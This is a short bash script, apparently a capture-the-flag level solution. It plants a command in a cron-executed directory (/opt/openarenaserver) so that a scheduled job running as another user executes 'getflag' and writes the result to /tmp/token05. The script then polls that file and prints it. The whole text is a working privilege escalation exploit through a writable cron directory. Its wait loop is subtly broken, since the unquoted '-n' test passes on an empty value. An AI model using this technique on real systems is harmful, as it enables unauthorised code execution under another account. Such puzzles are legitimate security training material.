#!/bin/bash
echo "#!/bin/bash" > /opt/openarenaserver/script.sh 
echo "getflag > /tmp/token05" >> /opt/openarenaserver/script.sh
echo "Now, wait 30sec max for the cron execute the file"

while true; do
	ret=`cat /tmp/token05 2> /dev/null`
    if [ -n $ret ]; then
    	break
    fi
    sleep 1
done

echo $ret